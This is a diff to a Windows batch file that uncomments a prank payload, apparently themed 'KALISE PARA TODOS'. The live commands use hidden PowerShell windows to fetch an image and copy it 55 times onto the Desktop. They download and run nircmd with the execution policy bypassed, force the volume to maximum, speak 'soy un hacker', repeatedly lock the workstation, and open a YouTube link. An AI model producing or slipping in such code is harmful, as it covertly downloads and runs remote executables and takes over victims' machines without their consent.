@@ -1,35 +1,35 @@
 @echo off
 
-@REM powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg' -OutFile \"$env:TEMP\kaliseParaTodos.png\""
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg' -OutFile \"$env:TEMP\kaliseParaTodos.png\""
 
-@REM start "" "https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg"
+start "" "https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg"
 
-@REM powershell -WindowStyle Hidden -Command "for ($i = 1; $i -le 55; $i++) { Copy-Item -Path \"$env:TEMP\kaliseParaTodos.png\" -Destination \"C:\Users\$env:USERNAME\Desktop\kaliseParaTodos$i.png\" }"
+powershell -WindowStyle Hidden -Command "for ($i = 1; $i -le 55; $i++) { Copy-Item -Path \"$env:TEMP\kaliseParaTodos.png\" -Destination \"C:\Users\$env:USERNAME\Desktop\kaliseParaTodos$i.png\" }"
 
-@REM set "NIR=%TEMP%\nircmd.exe"
+set "NIR=%TEMP%\nircmd.exe"
 
-@REM if not exist "%NIR%" (
-@REM     powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile \"$env:TEMP\nircmd.zip\"; Add-Type -AssemblyName System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\nircmd.zip\", \"$env:TEMP\")"
-@REM )
+if not exist "%NIR%" (
+    powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile \"$env:TEMP\nircmd.zip\"; Add-Type -AssemblyName System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\nircmd.zip\", \"$env:TEMP\")"
+)
 
-@REM "%NIR%" mutesysvolume 0
-@REM "%NIR%" setsysvolume 65535
+"%NIR%" mutesysvolume 0
+"%NIR%" setsysvolume 65535
 
-@REM powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('Hola, soy un hacker. Tengo un windows en un mac. KALISE PARA TODOS. Quien quiere un kalise???');"
+powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('Hola, soy un hacker. Tengo un windows en un mac. KALISE PARA TODOS. Quien quiere un kalise???');"
 
-@REM rundll32.exe user32.dll,LockWorkStation
+rundll32.exe user32.dll,LockWorkStation
 
-@REM "%NIR%" mutesysvolume 0
-@REM "%NIR%" setsysvolume 65535
+"%NIR%" mutesysvolume 0
+"%NIR%" setsysvolume 65535
 
-@REM start "" "https://www.youtube.com/watch?v=2iMQcqGK8yg"
+start "" "https://www.youtube.com/watch?v=2iMQcqGK8yg"
 
-@REM timeout /t 10 /nobreak >nul
+timeout /t 10 /nobreak >nul
 
-@REM "%NIR%" mutesysvolume 0
-@REM "%NIR%" setsysvolume 65535
+"%NIR%" mutesysvolume 0
+"%NIR%" setsysvolume 65535
 
-@REM rundll32.exe user32.dll,LockWorkStation
+rundll32.exe user32.dll,LockWorkStation
 
 setlocal enabledelayedexpansion
 
